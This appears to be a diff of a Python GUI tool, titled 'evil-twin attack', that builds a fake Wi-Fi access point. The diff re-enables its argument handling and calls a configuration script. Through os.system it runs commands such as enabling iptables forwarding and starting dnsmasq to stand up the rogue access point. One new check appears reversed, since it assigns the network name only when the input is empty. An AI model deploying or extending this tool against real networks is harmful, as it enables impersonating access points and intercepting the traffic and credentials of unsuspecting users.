@@ -7,16 +7,16 @@ import threading
 global window
 global sniffer_interface
 global network_name
-#sniffer_interface = sys.argv[1]
-#network_name = sys.argv[2]
+sniffer_interface = sys.argv[1]
+network_name = sys.argv[2]
 
 
 def outlinepritner(str):
     global window
     os.system(str)
     time.sleep(0.2)
-    ##window['_printer_'].update(str)
-    ##window.refresh()
+    window['_printer_'].update(str)
+    window.refresh()
 
 
 def reset_network():
@@ -47,12 +47,11 @@ def main():
     global sniffer_interface
     global network_name
     global window
-    #sniffer_interface = sys.argv[1]
-    #network_name = sys.argv[2]
-    sniffer_interface = "wlan0"
+    sniffer_interface = sys.argv[1]
+    network_name = sys.argv[2]
 
 
-    layout = [[sg.Text('Choose name for fake ap  ')],
+    layout = [[sg.Text('Choose name for create Fake ap ')],
               [sg.Input(key='Fake_name')],
               [sg.Button('select name'), sg.Button('Cancel')]]
 
@@ -62,14 +61,14 @@ def main():
     while True:
         event, values = window.read()
         if event == 'select name':
-
-            ##network_name=values['Fake_name']
+            if values['Fake_name'] =="":
+                network_name=values['Fake_name']
             window.close
             layout = [[sg.Text('Choose name for fake ap  ')],
                   [sg.Text('command run')],
                   [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
                            background_color='white')],
-                  [sg.Button('reset'), sg.Button('Cancel')]]
+                  [sg.Button('Cancel')]]
 
             window = sg.Window('evil-twin attack', layout
                                , finalize=True)
@@ -113,8 +112,8 @@ def commands_before_attack():
     # enable forwarding
     outlinepritner('iptables -P FORWARD ACCEPT')  #
 
-    ##line = "python3 Create_configuration_files.py " + sniffer_interface + " " + network_name
-    ##outlinepritner(line)
+    line = "python3 Conf_File_Server.py " + sniffer_interface + " " + network_name
+    outlinepritner(line)
 
     # start the AP
     outlinepritner('dnsmasq -C dnsmasq.conf')
